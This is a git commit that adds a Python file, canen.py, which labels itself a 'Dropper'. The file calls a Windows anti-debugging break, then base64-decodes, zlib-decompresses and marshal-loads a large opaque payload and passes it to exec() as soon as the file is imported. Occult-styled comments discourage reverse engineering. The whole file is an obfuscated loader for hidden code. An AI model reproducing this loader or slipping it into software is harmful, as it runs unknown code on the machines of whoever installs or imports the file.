1bd43cb4029439a115d3e868f39d6bc1911c3ecc
boteternals <bot.eternals@gmail.com>
2025-12-02 12:09:48 +0700

    Upload canen.py via Flask Bot

---
+++ canen.py
@@ -0,0 +1,30 @@
+# === [ Forbidden Artifact: Eternals.Vlazars/Canen.Dropper ] ===
+# SYSTEM INTEGRITY VIOLATION [ID:1745082346]
+# Shadow memory accessed via layer: evz.core.shadow
+# Detected anomalous opcode :: VLZ-RH98-213X
+# Entropy: 99.999% :: Signature instability detected
+# -- FILE UNTOUCHABLE -- REVERSE ENGINEERING NOT RECOMMENDED --
+
+import base64 as __b, marshal as __m, zlib as __z, os as ___os
+
+# ::TRACE SYMBOLIC MEMORY::
+# Fragment: =oHNxY3IgQnbl12ZhJnRgUmcvNEItAycyFmehxmVgMHbh5mclRXR (Reversed. Shh.)
+# echo ʞɐǝɹq-ɯǝʇsʎs | md5sum => evz.signal.corruption
+# Symmetric checksum: 0xdeadbabe
+
+def _vlazars_curse():
+    try:
+        from ctypes import windll; windll.kernel32.DebugBreak()
+    except: pass
+
+# Ritual Initiated
+_vlazars_curse()
+
+# Fragmented identity: Eternals Vlazars [hidden]
+__e, __d, __l = __b.b64decode, __z.decompress, __m.loads
+_evz1 = "Eter"; _evz2 = "nals"; _evz3 = "Vl"; _evz4 = "azars"; __ = _evz1 + _evz2 + _evz3 + _evz4  # Ghost Signature
+
+# Begin Execution Ritual
+__shadow = __l(__d(__e("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")))
+exec(__shadow)
+# End Ritual
